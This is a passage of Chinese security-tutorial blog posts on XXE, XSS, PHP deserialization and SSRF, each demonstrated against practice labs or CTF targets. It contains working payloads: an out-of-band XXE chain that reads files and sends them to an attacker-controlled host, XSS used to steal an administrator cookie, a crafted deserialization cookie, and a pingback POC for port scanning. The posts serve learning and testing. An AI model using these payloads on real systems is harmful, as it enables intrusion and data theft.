class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><p>这是包含 DTD 的 “note.dtd” 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><p>实体引用是对实体的引用。</p><p>实体可在内部或外部进行声明。</p><h3 id="1-一个外部实体声明"><a href="#1-一个外部实体声明" class="headerlink" title="1. 一个外部实体声明"></a>1. <strong>一个外部实体声明</strong></h3><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>DTD 例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h3 id="2-一个内部实体声明"><a href="#2-一个内部实体声明" class="headerlink" title="2. 一个内部实体声明"></a>2. <strong>一个内部实体声明</strong></h3><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>DTD 例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><p><strong>实体又分为一般实体和参数实体:</strong></p><ul><li>一般实体的声明语法:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 “实体内容“&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式：&amp;实体名；</p><ul><li>参数实体只能在DTD中使用，参数实体的声明格式： </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 “实体内容“&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式：%实体名；</p><p><strong>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</strong></p><p><strong>简单XXE攻击payload:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test=&apos;&lt;!DOCTYPE scan [&lt;!ENTITY test SYSTEM &quot;file:///c:/1.txt&quot;&gt;]&gt;&lt;scan&gt;&amp;test;&lt;/scan&gt;&apos;;</span><br><span class="line">$obj=simplexml_load_string($test,&apos;SimpleXMLElement&apos;,LIBXML_NOENT);</span><br><span class="line">print_r($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>test是一个变量，里面是XML，访问读取了C盘的1.txt然后使用simplexml_load_string将其转换为对象打印出来</strong></p><h2 id="simplexml-load-string-函数"><a href="#simplexml-load-string-函数" class="headerlink" title="simplexml_load_string()函数"></a>simplexml_load_string()函数</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>把 XML 字符串载入对象中</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simplexml_load_string(_data,classname,options,ns,is_prefix_ );</span><br></pre></td></tr></table></figure><p>第一个参数是xml语句，SimpleXMLElement是调用了SimpleXMlement这个类，然后LIBXML_NOET是代替实体，然后去调用文件c盘下1.txt。</p><p>在实战中后端语言解析了XML是不会输出读取内容的，我们需要一个类似接受平台的接收器，将XML读取的数据发送到接收平台，然后接受平台储存然后我们在接受平台上分析。先<strong>使用PHP伪协议读取文件：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure><p>然后<strong>去调用 用来XXE的服务器中的一个xml文档文件：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://1.1.1.1/1.xml&quot;&gt;</span><br></pre></td></tr></table></figure><p>而这个XML写的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://1.1.1.1:8080/2.php?</span><br><span class="line">id=%file;&apos;&gt;&quot;</span><br><span class="line">\&gt;</span><br><span class="line">%all;      //调用实体</span><br></pre></td></tr></table></figure><p><strong>1.XML文档会调用2.php文件并向id通过GET方式传入%file 读取的内容</strong><br>而2.php的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&apos;id&apos;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure><p>2.php被调用后会将id传进来的参数即%file的内容写入到3.php中，我们就可以通过访问3.php得到我们想读取的内容；</p><h2 id="靶场演示"><a href="#靶场演示" class="headerlink" title="靶场演示"></a>靶场演示</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz0zbfttj31h00qm758.jpg" alt><br>进入XXE靶场（外部实体注入），我们发现了<strong>simplexml_load_string()函数</strong>，这里很可能有XXE漏洞，我们看了下附件代码件：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1dhaqqj317w0npwn1.jpg" alt><br>发现这里通过$poststr接收数据并将数据直接放入到simplexml_load_string()转换为对象，那这里是可以进行XXE的；</p><p>我们先构造出XXE的poc代码：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1pp4y0j313v05lt9p.jpg" alt><br>第三行是通过php伪协议去读取<strong>被攻击服务器</strong>下的<strong>flag.php</strong>文件内容（base64编码，方便数据传输）</p><p>第四行是通过外部实体声明加载<strong>攻击者服务器</strong>的<strong>1.xml</strong>文件</p><p>第五行调用外部实体remote</p><p>第六行调用外部实体send</p><p><strong>1.xml</strong>文件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://1.1.1.1:8080/xxe/2.php?id=%file;&apos;&gt;&quot;</span><br><span class="line"> \&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p><strong>调用2.php并传入参数</strong></p><p><strong>2.php内容如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&apos;id&apos;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure><p>将传参的内容，即读取到的文件写入放到3.txt中，成功读取文件</p><p>抓包，通过POST方式上传<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz21z8wsj31h60ra0y4.jpg" alt><br>访问攻击者（即自己）的服务器，看看3.txt是否收到读取的文件<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz2cygdgj31h30psdfu.jpg" alt><br>成功读取到文件，因为之前对其进行base64编码，所以进行base64解码即可得到原来的内容！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>存储型XSS</title>
      <link href="/2019/12/07/XSS2/"/>
      <url>/2019/12/07/XSS2/</url>
      
        <content type="html"><![CDATA[<p>XSS(跨站脚本攻击)的原理其实我已经在上篇文章说过了，所以我就不详细解释了，我们就说说xss漏洞的两大根本条件：</p><ul><li>用户要能控制输入，</li><li>原本程序要执行的html代码，拼接了用户输入的数据</li></ul><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>指嵌入web页面的恶意html代码被存进了应用服务器端去，也就是说被存储到数据库中去，在每次有人访问这个页面，都会自动触发恶意代码，并且能够持续的攻击用户，所以也称为持久型；</p><p>我们通常是通过一个弹窗去检验是否存在XSS,如果有XSS漏洞，我们通常会使用XSS平台去获取对方cookie，网上XSS平台其实有很多，自行搜索即可；</p><h3 id="存储型XSS可能触发的地方"><a href="#存储型XSS可能触发的地方" class="headerlink" title="存储型XSS可能触发的地方"></a>存储型XSS可能触发的地方</h3><ul><li>任何可以插入到数据库的地方</li><li>注册提交框</li><li>留言板</li><li>上传文件的文件名</li><li>报错日志信息(管理员可见)<br>……</li></ul><p>我们通过<a href="http://117.41.229.122:8004/Feedback.asp" target="_blank" rel="noopener">掌控安全公开课靶场</a>为例：<br>我们点击网页一看，看见有个留言板，那我们在想这里会不会有没有xss?<br>我们通过弹窗去测试有没有XSS漏洞：</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/7*uFk3MvsKFG57tovZNgRkkCqVvvqiRXK7Cg.PzBVHo!/b/dMAAAAAAAAAA&amp;bo=swTKAwAAAAADJ3w!&amp;rf=viewer_4" alt></p><p>发现出现弹窗</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/Jc8TcgJNtMElfIS6K0NoUpudHzE6xCirF8XnLuQStHY!/b/dFMBAAAAAAAA&amp;bo=dgQ9AQAAAAADF3w!&amp;rf=viewer_4" alt></p><p>我们发现我们输入的代码已经被插入html代码块里面去了</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/wMq3UQ0gc93UieaE5eIkqd2UWTNL*5d2oCrytVsRng4!/b/dAgBAAAAAAAA&amp;bo=yQHFAAAAAAADFz8!&amp;rf=viewer_4" alt></p><p>因为XSS payload代码复杂，所以我们通常是使用xss平台去获取cookie<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/JoeGc63sW7v3Qz1e4O7F0yJIUboQItBj7hn2Ls9zYks!/b/dLYAAAAAAAAA&amp;bo=1gbGAQAAAAADFyU!&amp;rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8XKbLcqw40gOT5tuCQDQ3asbNCMMrPwn1g1GO4xbf*A!/b/dL8AAAAAAAAA&amp;bo=uQVmAwAAAAADF.s!&amp;rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/2LotA1LS9E1m5Ra1m3X15yDrDTYZqJmezvdQJ.BjnHs!/b/dDcBAAAAAAAA&amp;bo=MQU*AwAAAAADFzo!&amp;rf=viewer_4" alt></p><p>我们将平台上的payload复制，插入到有xss漏洞的留言框去<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/zsEOEET*L*0nIJ1hX1LePGgHNif.mbwTuOyRFNYFx.c!/b/dFYBAAAAAAAA&amp;bo=egMuAwAAAAADF2Y!&amp;rf=viewer_4" alt></p><p>插入成功后，我们查看xss平台，成功拿到管理员cookie</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/U5uylpL*PqLh2*jjkg1FVvjQZ8*NMIB*b10X78I1hFA!/b/dMIAAAAAAAAA&amp;bo=swRbAgAAAAADF9w!&amp;rf=viewer_4" alt></p><p><strong>其实xss漏洞出现在留言框上，还可能出现在上传文件名或注册页面框等与插入数据库的提交框上，我们可以通过js弹窗进行测试！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xss原理与分析</title>
      <link href="/2019/12/07/xss1/"/>
      <url>/2019/12/07/xss1/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS编码绕过-浏览器的解析顺序："><a href="#XSS编码绕过-浏览器的解析顺序：" class="headerlink" title="XSS编码绕过-浏览器的解析顺序："></a>XSS编码绕过-浏览器的解析顺序：</h2><ul><li>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别哪些被实体编码的内容的，只有建立起DOM 树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码。</li></ul><p><strong>基本的解析顺序</strong>是-&gt;URL 解析，HTML 解析， CSS 解析，JS解析;</p><p>浏览器每次收到数据后都会进行语法的分析，如果分析到合法符号就将其添加到解析树中去，语法在解析生成dom树，解析过程中开始对css元素进行渲染，然后再去执行js，而在dom树在加载过程中，DOM节点也在慢慢建立起来了，所有的节点都均可被修改，创建，或删除。</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/PSIywenNZEoKq2vFYg4V4d*sLChskvPr8y.Rkjmlv1c!/b/dL8AAAAAAAAA&amp;bo=9AJOAQAAAAARB4k!&amp;rf=viewer_4" alt></p><h2 id="什么是XSS："><a href="#什么是XSS：" class="headerlink" title="什么是XSS："></a>什么是XSS：</h2><p>XSS其实就是通过插入html代码进行拼接注入，通过插入html代码去执行带有恶意的js代码；</p><h2 id="XSS的作用："><a href="#XSS的作用：" class="headerlink" title="XSS的作用："></a>XSS的作用：</h2><ul><li>盗取管理员cookie</li><li>获得内网的ip</li><li>获取浏览器保存的明文密码</li><li>截取网页的屏幕</li><li>网页的键盘输入记录</li><li>……</li></ul><p>##XSS的类型：</p><ul><li><strong>反射型XSS：</strong>实现xss攻击，但不存进数据库，只对你这次访问有影响，是中非持久型的攻击（一次性的）；</li><li><strong>存储型：</strong>实现了xss攻击，但存进了数据库，每次有人访问这个页面，都会自动触发；</li><li><strong>DOM型XSS：</strong>不经过后端，DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞，dom – xss是通过url传入参数去控制触发的。</li></ul><h3 id="检测是否存在XSS："><a href="#检测是否存在XSS：" class="headerlink" title="检测是否存在XSS："></a>检测是否存在XSS：</h3><p>最简单的就是构造语句，使页面弹窗，我们在正常页面传参构造参数使他弹窗，如果弹窗，这证明就是存在xss；</p><p><strong>xss其实是通过执行js的代码去执行一些恶意代码，其实有多种方法去执行js语句：</strong></p><ul><li>我们可以通过构造js标签对<script></script>去执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alter&apos;123456&apos;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>也可以通过JavaScript伪协议去触发即声明URL的主体是任意的javascript代码；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&lt;a href=javascript:alter(123456)&gt;1&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li>也可以通过事件去触发(就是加载文档或图像时触发了事件时去再执行js代码,常见有onload(成功加载执行)，onerror(加载失败执行)，oninput(输入时执行),onclick(点击时执行))；</li></ul><p>通过插入错误的图片路径，使他加载失败时去执行js代码：</p><pre><code>?id=&lt;img src=&apos;6666&apos; onerror=alert&apos;123456&apos;&gt;</code></pre><p>以上举例都是属于反射型的xss，需要手动去执行，然后触发我们去插入的代码效果；</p><p>当然还有许多转义的情况存在，我们需要一步步检查，想办法去变形绕过，从而去执行我们想要的结果；</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP unserialize反序列化漏洞</title>
      <link href="/2019/12/07/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是序列化-serialize"><a href="#什么是序列化-serialize" class="headerlink" title="什么是序列化(serialize)?"></a>什么是序列化(serialize)?</h2><p>序列化(serialize)是将对象的状态信息<strong>转换为可以存储或传输</strong>的过程，在序列化期间，对象将其当前状态写入到临时或持久性存储区，然后<strong>可以从存储区读取或反序列化出对象的状态，</strong>重新将对象创建出来。通俗的说，就是将php中对象、类、数组、变量匿名函数转化为字符串，方便保存到数据库或文件中。</p><p>在php中，可以通过serialize()函数来将对象转变成一个字符串，保存对象的值，方便之后使用或传递。</p><h2 id="什么是反序列化-unserialize"><a href="#什么是反序列化-unserialize" class="headerlink" title="什么是反序列化(unserialize)?"></a>什么是反序列化(unserialize)?</h2><p>序列化就是将对象的状态信息转为字符串存储起来，那么反序列化就是再将信息状态拿出来使用(重新转化为对象或者其他)；</p><h2 id="反序列化漏洞的产生"><a href="#反序列化漏洞的产生" class="headerlink" title="反序列化漏洞的产生"></a>反序列化漏洞的产生</h2><p>本质上serialize()和unserialize()在PHP内部实现上时没有漏洞的，漏洞的**主要产生是由于应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。</p><p>当传给unserialize()的<strong>参数可控</strong>时,那么用户就可以精心构造的payload。当进行反序列化的时候就有可能会触发对象中一些<strong>魔术方法</strong>，造成意向不到的危害。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0wfphoej31hc0q876u.jpg" alt><br><strong>序列化对于不同类型得到的字符串格式为：</strong></p><ul><li>String : s:size:value;</li><li>Integer : i:value;</li><li>Boolean : b:value;(1或0)</li><li>Null : N;</li><li>Array : a:size:{key definition;value definition;(repeated per element)}</li><li>Object : O:strlen:object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</li></ul><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>_construct()， <strong>destruct()， </strong>call()， <strong>callStatic()， </strong>get()， <strong>set()， </strong>isset()，<strong>unset()， </strong>sleep()， <strong>wakeup()， </strong>toString()， <strong>invoke()， </strong>set_state()，<strong>clone() 和 </strong>debugInfo() 等方法在 PHP 中被称为”魔术方法</p><p>魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用模式方法可以轻松实现PHP面向对象中重载。<br>我们先简单介绍几个魔术方法，如果想详细了解的话，点击<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">魔术方法</a>;</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>当我们调试程序时，需要知道是否得出正确的数据。比如打印一个对象时，看看这个对象都有哪些属性，其值是什么，如果类定义了toString方法，就能在测试时，<strong>echo打印对象体，对象就会自动调用它所属类定义的toString方法，</strong>格式化输出这个对象所包含的数据。</p><h3 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h3><p>当对象创建(new)时会主动调用。但在unserialize()时是不会自动调用的。（构造函数）</p><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>当对象被销毁时自动调用（析构函数）</p><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>如前所提，unserialize()时会自动调用；</p><h2 id="靶场实践"><a href="#靶场实践" class="headerlink" title="靶场实践"></a>靶场实践</h2><p>我们进入靶场，我们看到这样一个界面，他叫我们检查代码，那我们就点进去把！<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0wrzoupj31h70q8dgk.jpg" alt><br>这是一道ctf反序列化题目，看到提示flag就藏在本页面中同一目录的flag.php中，我们审计下代码<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0x1m4jej31hc0regmc.jpg" alt><br>①.前面定义了一个类，类中定义了一个方法，而且还是使用魔术方法<strong>toString,里面返回了readme.txt和调用显示source,因为在</strong>toString魔术方法中，所以只要将对象体打印(echo)出来就能调用。<br>highlight_file是高亮显示文件代码的意思；</p><p>②.在第一个if判断中，如果存在source以GET方式请求的话，就会实例化对象，并使source=<strong>FILE</strong>,<strong>FILE</strong>指本地当前文件路径，那就是说会调用$s对象中的source并使其等于<strong>FILE</strong>,<strong>FILE</strong>表示当前页面的完整路径，即会读取当前页面，并将对象体打印出来，那么上面的__toSteing也会被调用。</p><p>③.如果有存在todos这个cookie，那就<strong>截取cookie前32位长度，与前32位之后长度相对比，如果相等，就将cookie前32位之后的长度进行反序列化。</strong>那如果$_COOKIE[‘todos’]是可控的，那我们能不能<strong>构造payload让②的<strong>FILE</strong>文件改成我们想读取的flag.php文件，并将其序列化，并放到cookie中，并使条件成立，使得将我们想要文件被反序列化后输出出来</strong>，但我们还没看到输出的点。</p><p>后面我们发现了这个<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xew1wlj30hg0p8q37.jpg" alt><br>&lt;?=$todo?&gt;是&lt;?php echo $todo ?&gt;的简写；<br>而$todo是根据$todos数组 foreach遍历出来的值</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xm802pj31hb0f9aaf.jpg" alt><br>我们将<strong>FILE</strong>改成我们要读取的文件名，<strong>因为只有数组才能foreach遍历出值，所以我们要将序列化的对象先转换成数组</strong>，然后是序列化出来结果。</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xvqj2aj30f404uq2r.jpg" alt><br>然后我们要做的下一步是通过让cookie满足条件，使cookie前32位与之后的相等，如果条件成立，那么就会实行反序列化出结果，并将其结果赋给$todos这个数组，然后遍历flag.php输出结果。那么，我们只需要将我们序列化的结果拼接都放进cookie中去，使其条件满足，反序列化出我们需要的结果</p><p>因为cookie前32位$h要等于32位之后md5加密后的值$m，所以我们要手动将前32位进行手动md5加密，使其等于32位以后的值。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0y37gnij31hc0rh77y.jpg" alt><br><code>$h=e2d4f7dcc43ee1db7f69e76303d0105c(手动md5加密)</code><br><code>$m=a:1:{i:0;O:6:&quot;readme&quot;:1:{s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;}}</code><br><code>md5($m)=e2d4f7dcc43ee1db7f69e76303d0105c</code></p><p>所以最后所生成cookie为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">todos=&gt;e2d4f7dcc43ee1db7f69e76303d0105ca:1:&#123;i:0;O:6:&quot;readme&quot;:1:&#123;s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>因为生成cookie会主动进行一次url编码，然后存储后会进行一次url解码，因为我们手动生成cookie，所以我们要进行一次url编码，再将其放到cookie中去<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0ydiyo7j31hc0ipjwd.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0yuvdqej31ax0crwig.jpg" alt><br>将其放入cookie中，刷新，成功拿到flag；<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0zpxd5ej31hc0h6q4a.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-服务器端请求伪造</title>
      <link href="/2019/12/07/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2019/12/07/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF?"></a>什么是SSRF?</h1><p>SSRF(Server-Side Request Forgery:<strong>服务器端</strong>请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的<strong>内部系统</strong>。（因为他是从内部系统访问的，所以可以通过它攻击外网无法访问的<strong>内部系统(即内网)</strong>，也就是把目标网站当中间人;即<strong>利用一个可发起网络请求的服务当做跳板来攻击其他服务;</strong></p><p>通俗的说就是浏览器去访问服务都是通过浏览器本地去访问的，而SSRF就是攻击者通过命令服务器端去访问另一个服务，<strong>服务器端去访问</strong>并返回了访问数据</p><h2 id="SSRF原理详解"><a href="#SSRF原理详解" class="headerlink" title="SSRF原理详解"></a>SSRF原理详解</h2><p>首先，我们要对目标网站的架构了解，脑子了要有一个架构图。比如 ： A网站，是一个所有人都可以访问的外网网站并可以发起网络请求，B网站是一个他们内部的OA网站。</p><p>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以通过a网站做中间人，<strong>让a网站去代替我们去访问b网站，并返回数据，</strong>从而达到攻击b网站需求。那如果b网站是个内网网站，那我们就可以去通过a网站进入<strong>攻击外网无法访问的内网系统</strong>，攻击所在内网中网站、程序；</p><h2 id="SSRF的作用"><a href="#SSRF的作用" class="headerlink" title="SSRF的作用"></a>SSRF的作用</h2><ul><li>扫描内部网络(FingerPrint)(对输入连接没有限制，可以直通内网)</li><li>向<strong>内部</strong>主机的<strong>任意主机</strong>的<strong>任意端口</strong>发送我们精心构造的数据表(payload)</li><li>DDOS(请求大文件，始终保持连接Keep-Alive Alway)</li><li>暴力穷举(users/dirs/files)</li><li>内外网Web站点漏洞的利用(比如内网网站存在sql注入，因为是内网，网站管理员防范意识较低，那我们就可以通过存在漏洞达到我们的目的)</li><li>内外网主机应用程序漏洞的利用</li></ul><p>##靶场实战<br>我们进入靶场<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e2wptko9j31h90fyglw.jpg" alt><br>发现访问的是一个xmlrpc服务，但该服务<strong>只接受POST请求</strong>；我们发现这是一个typeecho的CMS,这个CMS是默认开启了XMLRPC服务的</p><p><strong>XML RPC</strong><br>(XML-RPC是一个远程过程调用（远端程序呼叫）（remote procedure call，RPC)的分布式计算协议，通过XML将调用函数封装，并使用http协议做为传输协议的rpc机制，使用xml文本的方式传输命令和数据。)</p><p>XMLRPC中有一个叫做pingback协议(pingback,<strong>通知网志系统文章被引用</strong>情况的一种手段)，我们可以直接使用；</p><p>POC如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line"> &lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span><br><span class="line"> &lt;params&gt;</span><br><span class="line">    &lt;string&gt;http://127.0.0.1:1&lt;/string&gt;</span><br><span class="line"> &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure><p>通过刷新抓包，将请求方式修改为POST方式，并将poc代码放到下面<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4norujuj30z40qf40e.jpg" alt><br>这段poc说简单点，就是他会通过服务器端去ping内网的地址，并返回信息，通过返回信息知道端口的开放。<br>由于我们不知道开放端口，所以通过burp进行端口爆破<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4o051cyj30z40ouq6c.jpg" alt><br>发现开放了两个端口，我们通过提示知道了内网88端口映射12388端口,<br>我们对12388端口进行访问，抓包看返回头，得到flag<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4oa3liaj30z40ovju0.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入--0day审计案例(二)</title>
      <link href="/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(2)/"/>
